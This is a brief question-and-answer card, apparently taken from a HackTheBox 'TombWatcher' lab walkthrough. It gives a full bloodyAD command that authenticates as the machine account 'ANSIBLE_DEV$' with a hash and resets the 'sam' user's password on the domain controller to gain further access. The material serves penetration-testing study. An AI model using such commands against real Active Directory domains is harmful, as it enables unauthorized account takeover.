@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you reset the password for the 'sam' user account through an administrative account?
+
+CONTEXT:
+You have access as 'ANSIBLE_DEV$'.
+
+METHOD / ANSWER:
+Command: `bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p '1c37d00093dc2a5f25176bf2d474afdc' --host dc01.tombwatcher.htb set password 'sam' '0xdf0xdf!'`
+Explanation: This command changes the password for the 'sam' account to a new value, allowing for further access.
